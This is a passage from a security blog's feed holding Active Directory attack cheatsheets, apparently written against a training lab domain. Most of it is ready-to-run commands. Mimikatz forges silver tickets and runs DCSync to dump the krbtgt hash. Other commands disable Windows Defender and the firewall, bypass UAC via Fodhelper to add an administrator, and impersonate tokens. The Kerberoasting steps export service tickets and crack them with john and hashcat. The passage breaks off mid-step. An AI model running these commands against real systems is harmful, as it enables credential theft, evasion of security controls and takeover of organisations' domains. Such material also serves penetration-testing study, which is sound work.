&lt;p>In order to enable PowerShell Remoting the Silver Tickets for HOST, HTTP, WSMAN and RPCSS must be generated:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HOST /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HTTP /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:WSMAN /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:RPCSS /ptt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HOST /ptt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HTTP /ptt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:WSMAN /ptt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:RPCSS /ptt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Import a previously created ticket:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt ticket.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::ptt ticket.kirbi
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dcsync">DCSync&lt;/h2>
&lt;p>Use the DCSync feature to get krbtgt hash (requires DCSync privileges):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt /domain:cyberlab.local&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcsync /user:cyberlab\krbtgt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcsync /user:cyberlab\krbtgt /domain:cyberlab.local
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Domain Privilege Escalation cheatsheet</title><link>https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/</link><pubDate>Sun, 31 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0020-domain-privilege-escalation-cheatsheet/</guid><description>&lt;h2 id="windows-defender">Windows Defender&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable Windows Defender&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableRealtimeMonitoring&lt;/span> &lt;span class="vm">$true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-MpPreference&lt;/span> &lt;span class="n">-DisableIOAVProtection&lt;/span> &lt;span class="vm">$true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Disable Firewall&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">advfirewall&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="n">allprofiles&lt;/span> &lt;span class="n">state&lt;/span> &lt;span class="n">off&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## powershell.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-NetFirewallProfile&lt;/span> &lt;span class="n">-Profile&lt;/span> &lt;span class="n">Domain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Public&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Private&lt;/span> &lt;span class="n">-Enabled&lt;/span> &lt;span class="n">False&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="user-account-control-uac">User Account Control (UAC)&lt;/h2>
&lt;p>In case you are a member of the local administrators group, but you still have the &lt;em>Medium Mandatory Level&lt;/em> label, it is necessary to bypass the &lt;em>User Account Control (UAC)&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># FodhelperUACBypass.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">FodhelperUACBypass&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe /c powershell.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FodhelperUACBypass&lt;/span> &lt;span class="n">-program&lt;/span> &lt;span class="s2">&amp;#34;cmd.exe /c net localgroup administrators CYBERLAB\STUDENT01 /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Alternatively, you can use &lt;a href="https://github.com/FatRodzianko/SharpBypassUAC" target="_blank" rel="noopener">SharpBypassUAC&lt;/a>.&lt;/p>
&lt;h2 id="token-manipulation">Token Manipulation&lt;/h2>
&lt;p>Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.&lt;/p>
&lt;h3 id="incognito">Incognito&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># A SYSTEM shell is required&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">PsExec64&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-s&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">-d&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show tokens on the machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">list_tokens&lt;/span> &lt;span class="n">-u&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of a specific user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">execute&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">system32&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">calc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">incognito&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">execute&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="invoke-tokenmanipulation">Invoke-TokenManipulation&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show all tokens on the machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-ShowAll&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Show only unique, usable tokens on the machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-Enumerate&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of a specific user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-ImpersonateUser&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start new process with token of another process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-TokenManipulation&lt;/span> &lt;span class="n">-CreateProcess&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows\system32\calc.exe&amp;#34;&lt;/span> &lt;span class="n">-ProcessId&lt;/span> &lt;span class="mf">500&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="classic-kerberoasting">Classic Kerberoasting&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find user accounts used as Service accounts:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request a Ticket Granting Service (TGS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerShell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-Type&lt;/span> &lt;span class="n">-AssemblyName&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityModel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Tokens&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">KerberosRequestorSecurityToken&lt;/span> &lt;span class="n">-ArgumentList&lt;/span> &lt;span class="s2">&amp;#34;MSSQLSvc/database.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Request-SPNTicket&lt;/span> &lt;span class="n">-SPN&lt;/span> &lt;span class="s2">&amp;#34;MSSQLSvc/database.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the TGS has been granted:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">klist&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Export all tickets using Mimikatz&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::list /export&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Crack the Service account password (this step can be performed on a Kali machine):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">git&lt;/span> &lt;span class="n">clone&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">nidem&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">kerberoast&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">python3&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="n">tgsrepcrack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">py&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="mf">10&lt;/span>&lt;span class="n">-million-password-list-top&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1000000&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="p">./&lt;/span>&lt;span class="n">240a10000-STUDENT1&lt;/span>&lt;span class="nv">@MSSQLSvc&lt;/span>&lt;span class="p">~&lt;/span>&lt;span class="n">database&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">localCYBERLAB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LOCAL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>the same TGS can also be cracked by using &lt;code>john&lt;/code>, but it must be firstly converted into a compatible format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tgsrepcrack.py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5tgs ./tgs.john --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>An alternative way to perform Kerberoasting is to use &lt;code>PowerSploit&lt;/code> combined to &lt;code>john&lt;/code> or &lt;code>hashcat&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Find user accounts used as Service accounts:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-SPN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Request a TGS:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Kerberoast.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Kerberoast&lt;/span> &lt;span class="n">-OutputFormat&lt;/span> &lt;span class="n">john&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_tgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Kerberoast&lt;/span> &lt;span class="n">-OutputFormat&lt;/span> &lt;span class="n">hashcat&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_tgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Brute-force the exported ticket:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">john --format&lt;span class="o">=&lt;/span>krb5tgs --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt john_tgs.kirbi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># HashCat&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">13100&lt;/span> --force hashcat_tgs.kirbi ./10-million-password-list-top-1000000.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>hashcat&lt;/code> format can also be cracked by &lt;code>john&lt;/code>.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="targeted-kerberoasting-set-spn">Targeted Kerberoasting (Set SPN)&lt;/h2>
&lt;p>With enough rights (&lt;em>GenericAll&lt;/em>/&lt;em>GenericWrite&lt;/em>), a target user’s SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be “Kerberoasted”.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Let’s enumerate the permissions for RDPUsers on ACLs&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># PowerView
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match &amp;#34;RDPUsers&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the user already has a SPN:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">ServicePrincipalName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ServicePrincipalName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Set a SPN for the user (must be unique for the domain):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Set&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">serviceprincipalname&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s1">&amp;#39;ops/whatever1&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
